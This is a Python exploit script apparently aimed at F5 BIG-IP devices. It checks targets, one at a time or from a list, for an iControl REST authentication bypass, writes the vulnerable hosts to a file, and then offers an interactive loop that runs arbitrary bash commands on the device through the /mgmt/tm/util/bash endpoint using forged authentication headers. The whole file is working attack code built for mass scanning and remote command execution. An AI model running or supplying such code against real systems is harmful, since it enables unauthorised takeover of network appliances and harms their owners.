#!/usr/bin/python3

import argparse
import requests
import json
from urllib.parse import urlparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_standard_url(url):
    if not url.startswith("http"):
        url = "http://" + url
    o = urlparse(url)
    return "{}://{}".format(o.scheme, o.netloc)


def exploit(host):
    try:
        while True:
            command = input("[input your command]: ")
            url = f'{host}/mgmt/tm/util/bash'
            headers = {
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36",
                'Connection': 'close, X-F5-Auth-Token, X-Forwarded-For, Local-Ip-From-Httpd,X-F5-New-Authtok-Reqd,X-Forwarded-Server,X-Forwarded-Host',
                'X-F5-Auth-Token': 'anything',
                'Authorization': 'Basic YWRtaW46',
            }
            j = {"command": "run", "utilCmdArgs": f"-c '{command}'"}
            r = requests.post(url, headers=headers, json=j,
                              timeout=10, verify=False)
            print(r.json()['commandResult'].strip())

    except KeyboardInterrupt:
        print("[*] You issued a stop order")
    except Exception as e:
        print(f"[-] unknown error: {e}\n response is{r.text}")


def verify(host):
    vuln_url = f"{host}/mgmt/shared/authn/login"
    try:
        r = requests.get(vuln_url, verify=False, timeout=10)
        json.loads(r.text)
        if "resterrorresponse" in r.text or "message" in r.text:
            return True
    except:
        pass
    return False


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument(
        '-t', '--target', help='The url of the target')
    parser.add_argument('-f', '--file', type=str,
                        help="The file of target list")
    parser.add_argument("--verify", default=False, action='store_true')
    args = parser.parse_args()
    if args.target:
        host = get_standard_url(args.target)
        if verify(host):
            print(f"[+] {host} is vulnerable")
        if not args.verify:
            exploit(host)
    elif args.file:
        res = []
        with open(args.file) as f:
            for url in f.readlines():
                host = get_standard_url(url.strip())
                if verify(host):
                    print(f"[+] {host} is vulnerable")
                    res.append(host)
        with open("success.txt", "a") as f:
            f.write("\n".join(res))
    else:
        print("[-] use -t or -f to specify target")
